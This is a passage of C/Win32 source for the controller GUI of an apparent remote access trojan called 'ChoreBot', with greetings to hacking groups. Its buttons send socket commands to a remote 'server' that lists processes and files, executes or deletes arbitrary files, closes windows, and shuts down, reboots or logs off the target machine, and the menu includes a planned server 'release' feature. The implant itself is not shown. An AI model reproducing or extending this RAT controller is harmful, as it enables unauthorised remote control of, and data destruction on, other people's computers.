    int x = SCR_WIDTH / 8, y = SCR_HEIGHT /8;

    hwnd = CreateWindowEx (
           0,
           szClassName,
           "ChoreBot Remote Control Service v0.1 Build 3",
           WS_SYSMENU | WS_MINIMIZEBOX,
           x,
           y,
           800,
           600,
           HWND_DESKTOP,
           NULL,
           hThisInstance,
           NULL
           );

    ShowWindow (hwnd, nFunsterStil);

    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }

    return messages.wParam;
}


LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{        
    PAINTSTRUCT ps;
    HDC hdc;
    int statwidths[] = {180, -1};
        
    switch (message)
    {
    case WM_DESTROY:
    strcpy(Command, "bye");
    send(server, Command, 8, 0);
    PostQuitMessage (0);
    break;
    
    case WM_CTLCOLORSTATIC:
	SetTextColor((HDC)wParam,RGB(139, 26, 26));
	SetBkMode((HDC)wParam,RGB(139, 26, 26));
	return (INT_PTR)GetStockObject(NULL_BRUSH);
    
    case WM_PAINT:
    hdc = BeginPaint(hwnd, &ps);
    
    TextOut(hdc, 133, 223, Text, sizeof(Text) - 1);
    EndPaint(hwnd, &ps) ;
    break;
    
    case WM_CREATE:       
         
            HMENU hMenu;
            HMENU hMenuInfo1;
            HMENU hMenuInfo2;
            HMENU hMenuInfo3;
            
            hMenu = CreateMenu();
            hMenuInfo1 = CreateMenu();
            hMenuInfo2 = CreateMenu();
            hMenuInfo3 = CreateMenu();
            AppendMenu(hMenu, MF_POPUP, (UINT) hMenuInfo1, "File");
            AppendMenu(hMenuInfo1, MF_STRING, Exit, "Exit");
            AppendMenu(hMenu, MF_POPUP, (UINT) hMenuInfo2, "Release");
            AppendMenu(hMenu, MF_POPUP, (UINT) hMenuInfo3, "About");
            AppendMenu(hMenuInfo2, MF_STRING, ReleaseSrvr, "Server");
            AppendMenu(hMenuInfo3, MF_STRING, About, "About");
            AppendMenu(hMenuInfo3, MF_STRING, Donate, "Donate");
            AppendMenu(hMenuInfo3, MF_STRING, Thanksto, "Thanx to:");
            SetMenu(hwnd, hMenu);
            
            HICON hIcon, hIconSm;
 			hIcon = (HICON)LoadImage(NULL, "icon.ico", IMAGE_ICON, 32, 32, LR_LOADFROMFILE);
			if(hIcon)
			{
				SendMessage(hwnd, WM_SETICON, ICON_BIG, (LPARAM)hIcon);
			}
			hIconSm = (HICON)LoadImage(NULL, "icon.ico", IMAGE_ICON, 16, 16, LR_LOADFROMFILE);
			if(hIconSm)
			{
				SendMessage(hwnd, WM_SETICON, ICON_SMALL, (LPARAM)hIconSm);
			}
         
    WindowProcs = CreateWindowEx(0, "Button", "Processes", WS_VISIBLE | WS_CHILD | WS_BORDER, 5, 70, 100, 40, hwnd, (HMENU)GetProcesses, 0, NULL);
    WindowFiles = CreateWindowEx(0, "Button", "Files", WS_VISIBLE | WS_CHILD | WS_BORDER, 5, 115, 100, 40, hwnd, (HMENU)GetFiles, 0, NULL);
    GetWindowTitle = CreateWindowEx(0, "Button", "Get Wnd", WS_VISIBLE | WS_CHILD | WS_BORDER, 305, 230, 70, 22, hwnd, (HMENU)GetWindow, 0, NULL);
    ShowWnd = CreateWindowEx(0, "Button", "Show", WS_VISIBLE | WS_CHILD | WS_BORDER, 305, 205, 70, 22, hwnd, 0, 0, NULL);
    HideWnd = CreateWindowEx(0, "Button", "Hide", WS_VISIBLE | WS_CHILD | WS_BORDER, 380, 205, 70, 22, hwnd, 0, 0, NULL);
    WindowTitle = CreateWindowEx(0, "Edit", 0, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_READONLY, 470, 230, 320, 20, hwnd, 0, 0, NULL);
    static_WndTitle = CreateWindow("Static","Current Window Opened ...",WS_CHILD | WS_VISIBLE, 470, 205, 320, 20, hwnd, 0, 0, 0);	
    CloseW = CreateWindowEx(0, "Button", "Close", WS_VISIBLE | WS_CHILD | WS_BORDER, 380, 230, 70, 22, hwnd, (HMENU)Close, 0, NULL);
    Execute = CreateWindowEx(0, "Button", "Execute", WS_VISIBLE | WS_CHILD | WS_BORDER, 305, 270, 70, 22, hwnd, (HMENU)Exec, 0, NULL);
    Remove = CreateWindowEx(0, "Button", "Remove", WS_VISIBLE | WS_CHILD | WS_BORDER, 380, 270, 70, 22, hwnd, (HMENU)Remv, 0, NULL);
    ExecPath = CreateWindowEx(0, "Edit", 0, WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL, 470, 270, 320, 20, hwnd, (HMENU)ExecP, 0, NULL);
    CDopen = CreateWindowEx(0, "Button", "Open CD", WS_VISIBLE | WS_CHILD | WS_BORDER, 5, 300, 72, 22, hwnd, (HMENU)OpenCD, 0, NULL);
    CDclose = CreateWindowEx(0, "Button", "Close CD", WS_VISIBLE | WS_CHILD | WS_BORDER, 5, 330, 72, 22, hwnd, (HMENU)CloseCD, 0, NULL);
    StopServer = CreateWindowEx(0, "Button", "Stop Server", WS_VISIBLE | WS_CHILD | WS_BORDER, 5, 480, 100, 40, hwnd, (HMENU)SPserver, 0, NULL);
    RemoveServer = CreateWindowEx(0, "Button", "Uninstall Srvr", WS_VISIBLE | WS_CHILD | WS_BORDER, 690, 480, 100, 40, hwnd, (HMENU)RemoveS, 0, NULL);
    terminalWindow = CreateWindow ("listbox",NULL, WS_CHILD | WS_VISIBLE | ES_READONLY | WS_VSCROLL, 305, 5, 486, 200, hwnd,(HMENU) 5, ((LPCREATESTRUCT) lParam)->hInstance, NULL);
    connectButton = CreateWindowEx (0, "button","Connect", WS_CHILD | WS_VISIBLE | WS_BORDER ,5,5, 100, 50, hwnd,(HMENU)ConnectBtn, 0, NULL);
    CreateWindow("static","lol!",WS_CHILD | WS_VISIBLE | BS_GROUPBOX,305 ,310,485,35,hwnd,NULL, 0,NULL);
    ShutdownBtn = CreateWindowEx (0, "button","Shutdown", WS_CHILD | WS_VISIBLE | WS_BORDER ,312,315, 115, 25, hwnd,(HMENU)Shutdown, 0, NULL);
    RebootBtn = CreateWindowEx (0, "button","Reboot", WS_CHILD | WS_VISIBLE | WS_BORDER ,430,315, 115, 25, hwnd,(HMENU)Reboot, 0, NULL);
    LogoffBtn = CreateWindowEx (0, "button","Log Off", WS_CHILD | WS_VISIBLE | WS_BORDER ,549,315, 115, 25, hwnd,(HMENU)LogOFF, 0, NULL);
    SleepBtn = CreateWindowEx (0, "button","Sleep", WS_CHILD | WS_VISIBLE | WS_BORDER ,668,315, 115, 25, hwnd,(HMENU)Sleeps, 0, NULL);
    hwndListOfIP = CreateWindow(TEXT("Combobox"), NULL, WS_CHILD | WS_VISIBLE | LBS_STANDARD, 130, 30,150,300, hwnd, (HMENU)IPsConnected, 0, NULL);
    CreateWindow("Static","IP's Connected:",WS_CHILD | WS_VISIBLE, 130, 5, 150, 20, hwnd, 0, 0, 0);	


    SendMessage(terminalWindow, LB_ADDSTRING, 0, (LPARAM) "Welcome to the ChoreBot Remote Access Program\0");
    SendMessage(terminalWindow, LB_ADDSTRING, 0, (LPARAM) "C0ded by J0hn H0der!\0");
    SendMessage(terminalWindow, LB_ADDSTRING, 0, (LPARAM) "-----------------------------------------------------------------------------------------------------------------------\0");
    
    //FillListBox(hwndListOfIP);
    
    /*TCHAR pVarName[30];
    GetWindowText(hwndListOfIP, pVarName, sizeof(pVarName));
    SetWindowText(hwndListOfIP, pVarName);*/
    
    strcpy(Command, "GetIP");
    send(server, Command, sizeof(Command), 0);
    recv(server, Ip, sizeof(Ip), 0);
    SendMessage(hwndListOfIP, CB_ADDSTRING, 0, (LPARAM)"Not working correctly so far!");
    SendMessage(hwndListOfIP, CB_ADDSTRING, 0, (LPARAM)Ip);
    SendMessage(hwndListOfIP, CB_SETCURSEL, 0, 0);

    hStatus = CreateWindowEx(0, STATUSCLASSNAME, NULL, WS_CHILD | WS_VISIBLE, 0, 0, 0, 0, hwnd, (HMENU)IDC_MAIN_STATUS, GetModuleHandle(NULL), NULL);

    SendMessage(hStatus, SB_SETPARTS, sizeof(statwidths)/sizeof(int), (LPARAM)statwidths);
    CreateThread(0,0,(LPTHREAD_START_ROUTINE) internet,0,0,0);
    
    
    EDbleWindow(false);
    break;

    case WM_COMMAND:
         
    //CreateThread(0,0,(LPTHREAD_START_ROUTINE) RecvIP,0,0,0);
    SendMessage(hStatus, SB_SETTEXT, 1, (LPARAM)Ip);
         
    switch(LOWORD(wParam))
    {
    if(HIWORD(wParam) == 0) 
    {
    case File:
    strcpy(Command, "bye");
    send(server, Command, 5, 0);
    PostQuitMessage(0);
    break;
    
    case About:
    CreateThread(0,0,(LPTHREAD_START_ROUTINE) AboutWnd,0,0,0);
    break;
    
    case Donate:
    MessageBox(NULL, "lol","Donate", 0);
    break;
    
    case Thanksto:
         MessageBox(NULL, "Thanks to: Lionaneesh, Coded32 \n\n Greetz to: ICF Team, Indishell team, ICA Team, Pranshu Jain \n Lethal Code, Pranav Mishra, Optik Fiber and to all who support me!","Thanks and Greetz", 0);
    break;
    
    case Shutdown:
    strcpy(Command, "Shutdown");
    send(server, Command, sizeof(Command), 0);
    break;
    
    case Reboot:
    strcpy(Command, "Reboot");
    send(server, Command, sizeof(Command), 0);
    break;
    
    case LogOFF:
    strcpy(Command, "Log off");
    send(server, Command, sizeof(Command), 0);
    break;
    
    case Sleeps:
    strcpy(Command, "Sleep");
    send(server, Command, sizeof(Command), 0);
    break;
    
    case ReleaseSrvr:
    MessageBox(NULL, "This feature will be available soon!", "Come Soon", 0);
    break;
    }
    
    case Exit:
    PostMessage(hwnd, WM_CLOSE, 0, 0);
    break;
    
    case ConnectBtn:
    CreateThread(0, 0, PortWnd, 0, 0, 0);
    EnableWindow(connectButton, false);
    break;
         

    case GetProcesses:
    TerminateThread(Procs, 0);
    Procs = CreateThread(NULL, 0, PWindow, 0, 0, NULL);
    TerminateThread(RecvProc, 0);
    RecvProc = CreateThread(NULL, 0, RecvProcesses, 0, 0, NULL);
    strcpy(Command, "GetProcesses");
    send(server, Command, 20, 0);
    break;
    
    case GetFiles:
    TerminateThread(FileS, 0);
    FileS = CreateThread(NULL, 0, FWindow, 0, 0, NULL);
    break;
    
    case GetWindow: 
    strcpy(Command, "GetWindow");
    send(server, Command, 15, 0);
    recv(server, Data, sizeof(Data), 0);
    SetWindowText(WindowTitle, Data);
    break;
    
    case Close:
    strcpy(Command, "CloseWindow");
    send(server, Command, 20, 0);
    SendMessage(terminalWindow, LB_ADDSTRING, 0, (LPARAM) "Current Window has been closed\0");
    break;
    
    case Exec:
    strcpy(Command, "Execute");
    send(server, Command, 15, 0);
    GetDlgItemText(hwnd, ExecP, Data, sizeof(Data));
    if(!strcmp(Data, ""))
    {
    MessageBox(NULL, "Execute path is empty !", "Execute", MB_OK | MB_ICONWARNING);
    send(server, Data, 10, 0);
    }
    
    else
    {
    send(server, Data, sizeof(Data), 0);
    MessageBox(NULL, "File executed !", "Execute", MB_OK | MB_ICONINFORMATION);
    }
    break;
    
    case Remv:
    strcpy(Command, "Remove");
    send(server, Command, 15, 0);
    GetDlgItemText(hwnd, ExecP, Data, sizeof(Data));
    if(!strcmp(Data, ""))
    {
    MessageBox(NULL, "Remove path is empty !", "Remove", MB_OK | MB_ICONINFORMATION);
    send(server, Data, sizeof(Data), 0);
    }
    
    else
    {
    send(server, Data, sizeof(Data), 0);
    recv(server, Data, 20, 0);
    if(!strcmp(Data, "Error"))
    {
    MessageBox(NULL, "Error by removing file !", "Remove", MB_OK | MB_ICONWARNING);
    }
    
    else
    {
    MessageBox(NULL, "File removed successfully !", "Remove", MB_OK | MB_ICONINFORMATION);
    }
    }
    break;
    
    case OpenCD:
    strcpy(Command, "OpenCD");
    send(server, Command, 10, 0);
    SendMessage(terminalWindow, LB_ADDSTRING, 0, (LPARAM) "CD-ROM opened!\0");
    break;
    
    case CloseCD:
    strcpy(Command, "CloseCD");
    send(server, Command, 10, 0);
    SendMessage(terminalWindow, LB_ADDSTRING, 0, (LPARAM) "CD-ROM closed\0");
    break;
    
    case SPserver:
    strcpy(Command, "stop");
    send(server, Command, 10, 0);
    EDbleWindow(false);
    SendMessage(terminalWindow, LB_ADDSTRING, 0, (LPARAM) "Server disconnected!\0");
    EnableWindow(connectButton, true);
    break;
    
    case RemoveS:
    strcpy(Command, "Uninstall");
    send(server, Command, 20, 0);
    recv(server, Data, 20, 0);
    
    if(!strcmp(Data, "Error"))
    {
    MessageBox(NULL, "Failed to remove the server !", "Remove Server", MB_OK | MB_ICONWARNING);
    }
    
    else
    {
    EDbleWindow(false);
    TerminateThread(SOCK, 0);
    TerminateThread(Procs, 0);
    TerminateThread(FileS, 0);
    TerminateThread(RecvProc, 0);
    TerminateThread(RecvFiles, 0);
    TerminateThread(Recv, 0);
    MessageBox(NULL, "Server removed successfully !", "Remove Server", MB_OK | MB_ICONINFORMATION);
    }
    break;
    }
    
    default:
    return DefWindowProc (hwnd, message, wParam, lParam);
    }

    return 0;
}
